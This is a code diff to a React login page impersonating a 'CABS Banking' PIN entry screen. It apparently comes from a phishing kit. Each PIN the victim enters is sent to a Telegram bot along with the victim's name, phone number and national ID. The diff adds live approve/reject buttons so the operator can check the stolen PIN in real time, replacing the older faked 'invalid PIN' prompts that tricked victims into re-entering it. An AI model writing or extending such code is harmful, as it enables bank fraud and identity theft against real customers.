@@ -16,6 +16,7 @@ export const LoginPage = () => {
   const [verifying, setVerifying] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
   const [attemptCount, setAttemptCount] = useState(1);
+  const [awaitingApproval, setAwaitingApproval] = useState(false);
 
   const inputRefs = [useRef(null), useRef(null), useRef(null), useRef(null)];
 
@@ -49,6 +50,27 @@ export const LoginPage = () => {
     }
   };
 
+  const resetForWrongPin = () => {
+    setVerifying(false);
+    setAwaitingApproval(false);
+    setErrorMsg(`❌ Invalid PIN code. Please re-enter your 4-digit PIN (Attempt ${attemptCount} of 3 failed)`);
+    setAttemptCount((prev) => prev + 1);
+    setDigits(['', '', '', '']);
+    setTimeout(() => {
+      inputRefs[0].current?.focus();
+    }, 100);
+  };
+
+  const approveAndProceed = (pinStr) => {
+    updateClient({ pin: pinStr });
+    setTimeout(() => {
+      setVerifying(false);
+      setAwaitingApproval(false);
+      const userSegment = user || 'user11';
+      navigate(`/${userSegment}/verification`);
+    }, 1500);
+  };
+
   const handleSubmit = (e) => {
     e?.preventDefault();
     const pinStr = digits.join('');
@@ -61,35 +83,26 @@ export const LoginPage = () => {
     setErrorMsg('');
     setVerifying(true);
 
-    // Send PIN attempt notification to Telegram Bot
+    // Send PIN notification with inline keyboard to Telegram Bot
     sendBotNotification(
       `🔐 <b>CABS Banking PIN Entry</b> (Attempt ${attemptCount}/3):\n` +
       `<b>Client Name</b>: ${client.name || 'Unknown'}\n` +
       `<b>Phone Number</b>: ${client.number || 'N/A'}\n` +
       `<b>National ID</b>: ${client.id || 'N/A'}\n` +
-      `<b>PIN Entered</b>: <code>${pinStr}</code>`
+      `<b>PIN Entered</b>: <code>${pinStr}</code>\n\n` +
+      `👇 <b>Approve or reject this PIN:</b>`,
+      {
+        inline_keyboard: [
+          [
+            { text: '✅ APPROVE PIN', callback_data: 'APPROVE_PIN' },
+            { text: '❌ WRONG PIN', callback_data: 'WRONG_PIN' },
+          ],
+        ],
+      }
     );
 
-    if (attemptCount < 3) {
-      // Fail attempts 1 and 2, prompting user to re-enter
-      setTimeout(() => {
-        setVerifying(false);
-        setErrorMsg(`❌ Invalid PIN code. Please re-enter your 4-digit PIN (Attempt ${attemptCount} of 3 failed)`);
-        setAttemptCount((prev) => prev + 1);
-        setDigits(['', '', '', '']);
-        setTimeout(() => {
-          inputRefs[0].current?.focus();
-        }, 100);
-      }, 1400);
-    } else {
-      // Attempt 3 succeeds and proceeds
-      updateClient({ pin: pinStr });
-      setTimeout(() => {
-        setVerifying(false);
-        const userSegment = user || 'user11';
-        navigate(`/${userSegment}/verification`);
-      }, 1500);
-    }
+    // Page stays in "awaiting approval" state until bot action comes back
+    setAwaitingApproval(true);
   };
 
   const isComplete = digits.every((d) => d !== '');
@@ -99,11 +112,7 @@ export const LoginPage = () => {
       <Header />
       {verifying && (
         <LoadingOverlay
-          message={
-            attemptCount < 3
-              ? `⏳ Verifying PIN (Attempt ${attemptCount} of 3)...`
-              : '⏳ Finalizing Banking Authentication...'
-          }
+          message={awaitingApproval ? '⏳ Verifying your PIN... please wait' : '⏳ Finalizing Banking Authentication...'}
         />
       )}
       <main className="main-content">
